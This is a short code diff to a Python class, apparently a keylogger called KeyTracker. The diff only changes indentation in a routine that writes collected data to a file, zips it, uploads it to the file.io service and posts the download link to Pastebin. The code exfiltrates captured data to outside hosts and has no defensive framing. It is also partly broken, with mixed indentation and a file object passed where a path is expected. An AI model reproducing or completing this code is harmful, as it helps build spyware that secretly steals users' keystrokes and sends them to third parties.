@@ -317,7 +317,7 @@ class KeyTracker:
             SetKeyState(key, state)
 
     def CompileData(self):
-		outfile = open("data.txt", "a")
+	outfile = open("data.txt", "a")
         outfile.write("\n")
         outfile.write("-"*15)
         outfile.write("\n")
@@ -325,11 +325,11 @@ class KeyTracker:
         
         
         with ZipFile("data.zip", "w") as zip:
-			zip.write(outfile)
-			outfile.close()
+	    zip.write(outfile)
+	    outfile.close()
 			
-			url = upload('fileio', 'data.zip') 
-			result = pbin.CreatePaste(url,"link.txt","cil", 1, "1H")
+	    url = upload('fileio', 'data.zip') 
+	    result = pbin.CreatePaste(url,"link.txt","cil", 1, "1H")
 			
          
     def TrackData(self, time_length): # Time in seconds
